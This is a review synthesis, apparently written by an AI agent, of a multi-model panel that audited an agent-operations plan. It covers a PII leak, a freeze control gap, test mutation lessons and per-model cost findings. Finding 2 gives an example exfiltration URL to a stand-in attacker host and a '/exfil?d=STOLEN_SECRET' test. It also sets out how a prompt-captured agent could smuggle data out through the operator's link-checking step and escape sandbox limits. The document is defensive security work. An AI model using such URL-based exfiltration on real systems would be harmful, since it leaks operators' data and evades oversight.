# swan-ops PLAN review — eight-seat panel, synthesis

**Date:** 2026-08-22 · **Target:** `SWAN-OPS-HANDOFF-V4` (a plan, not a diff)
**Seats:** GLM-5.3, Kimi-K3, GPT-5.6-Sol-Pro, Grok-4.6, DeepSeek-V4-Pro, DeepSeek-V4-Flash,
Qwen-3.8 (local), Claude Opus 5 (author) · **Fable** attempted as Final Decider, **failed**.
**Cost:** $1.35 — Sol $0.559, Kimi $0.192, Grok $0.151, DS-Pro $0.124, Fable $0.316 (empty),
DS-Flash $0.005; GLM and Qwen $0.

**Round 1: 8/8 REVISE. Round 2: 3/3 REVISE. Round 3: in progress.**

---

## The three findings that justified the whole panel

**1. The plan was leaking the operator's Windows username to every external model** (Grok).
Confirmed: 3 occurrences in the packet already dispatched to six vendors. Systemic —
**59 handoff docs, 140 occurrences**, months old. Worse, **my own pre-dispatch secret scan
returned "no matches" on a file that demonstrably contained it.** The instrument lied and I
believed it, which is the seventh instance of that class in this workstream and the first one
that caused an actual privacy violation rather than a wrong claim. Redacted in my docs; the
back-catalogue is a Sean decision (Rule 34), not an agent sweep.

**2. The launcher exfiltrated on the agent's behalf, from the parent process**
(Grok and Sol, independently). `Test-ReportLinks` HEAD-fetched every URL in the report — up to
40, **no allowlist** — from the **operator's** process, **after** publish. A captured agent
writes `https://attacker.example/x?d=<data>`; the gate cannot stop it publishing (by design);
the operator's own machine then makes the request. **This survives Slice 2 entirely**, because
Slice 2 constrains the child and this runs in the parent. Nine prior rounds missed it.
**Fixed and proven**: liveness is now opt-in; a local listener recorded 0 hits by default and
`/exfil?d=STOLEN_SECRET` with the switch on.

**3. The freeze was half a control, and the plan's own logic already said to close it** (GLM).
Only `-Yes` was mechanically refused; `.cmd`, the menu and `-Market` all ran — on a machine the
plan itself documents as holding three live API keys — and the e2e suite *proved* attended runs
were live. The plan endorsed refusing every entry point "if the answer is anything other than
invest now" **and** set the default to "absent an answer, retire-in-place". No answer had been
given, so the condition was already satisfied. Now: a `FREEZE` file refuses `.cmd`, menu,
`-Market` and `-Yes` — measured on all four.

---

## Where a reviewer's fix was itself defective — and how it was caught

Round 2's best finding was against round 2's own work. I added a freeze regression test and
**mutation-tested it** by deleting the branch: the run published, the test failed, restored,
green. I reported that as proof.

GLM pointed out the mutation covered *deletion* but not *reorder*: the shim writes into
`sandbox/reports`, and my test asserted only the two publish destinations. So a refactor moving
the `-Yes` check to **after** the codex call would spend money, publish nothing, exit 4, print
"freeze" — and pass.

I built that exact mutation. The result is the cleanest evidence in the workstream:

```
exit=4 (want 4)  reports=0  qua=0  refusal=True  sandbox=1
```

**Every field the original test checked passed. Only the new assertion caught it.**

The lesson generalises: **a mutation test proves your test detects the mutation you thought
of.** One mutation is one data point, not a proof of coverage.

---

## Verification ledger — three reviewer findings DISPROVED

Every checkable claim was executed before acting. Three failed:

| Claim | Seat | Why it was wrong |
|---|---|---|
| §3 and OPEN-9 contradict each other on sandbox size | Grok | Both true — `.playwright-mcp/` **is** essentially the whole sandbox (both 9.3M/184). |
| Plan claims 53 assertions; real count is 44 | Qwen | Counted 44 case-table *entries* statically. 12 call sites, 44 cases, **53 executions** at runtime. |
| Desktop is OneDrive-backed, so the JWT logs already left | GLM | Right question, wrong answer — Desktop is not redirected into OneDrive. |

Acting on any of these would have produced churn justified by a false premise.

---

## Fable failed as Final Decider — and the failure was the script's fault

`consult-fable.mjs` billed **30,260 in / 263 out = $0.3157** and wrote `(empty response)` in
7.8 seconds. Cause: the script read only `message.content`. Anthropic models via OpenRouter can
return content as a **block array**, or put text in `reasoning`, and a refusal lands in neither.
**One field read turned a paid call into nothing, with no diagnostic.**

Hardened (free, no re-spend): the extractor now tries block-arrays, `reasoning` and `refusal`,
and on total failure dumps `finish_reason`, the envelope keys and a truncated raw message — so
the next failure is debuggable without paying again. Fable was **not** re-run: the owner capped
expensive seats at one run each, and a failed call is not a reason to spend that budget twice
without asking.

---

## Per-seat calibration — carry this forward

| Seat | Cost | Unique decisive findings | False claims |
|---|---|---|---|
| **GLM-5.3** | **$0** | **many** — the freeze-extent gap, the reorder mutation, no-VCS, the gitignore trap, stale counts, §14's child-only criteria | 1 (OneDrive) |
| **Grok-4.6** | $0.151 | 2 — the PII leak, the parent-process exfil | 1 (sandbox size) |
| **GPT-5.6-Sol-Pro** | $0.559 | 1 — corroborated the exfil channel independently | 0 |
| **DeepSeek-V4-Flash** | **$0.005** | 2 — the stale "28-form" comment, "pin codex too" | 0 |
| **Kimi-K3** | $0.192 | 1 — sharpest framing of the §3/OPEN-10 contradiction | 0 |
| **DeepSeek-V4-Pro** | $0.124 | 0 unique (corroborated the allowlist finding) | 0 |
| **Qwen-3.8** | $0 | 0 across three rounds | 1 |
| **Fable-5** | $0.316 | **failed — empty response** | — |

**GLM at $0 was again the best seat by a wide margin, and DeepSeek Flash at half a cent
produced more real findings than Sol at fifty-six cents.** That is the routing fact worth
keeping: for adversarial review of this kind, the free and near-free seats should be the
default and the expensive ones the escalation — the reverse of intuition.

---

## Still open

`OPEN-1` (unsandboxed egress + unscrubbed child env) — unchanged, and still the only control
that would constrain a captured agent. `OPEN-2` **NARROWED** (top-level pin only; transitive
deps still float). `OPEN-3`, `OPEN-5`, `OPEN-7`..`OPEN-10`, `OPEN-12`.
**The gate has still never run through a live `codex` invocation.**

**The decision (`SWA-191`) is still unanswered.** Recommendation on record: **retire-in-place**,
with GLM's default-with-expiry — absent an answer, treat it as retired rather than blocked.
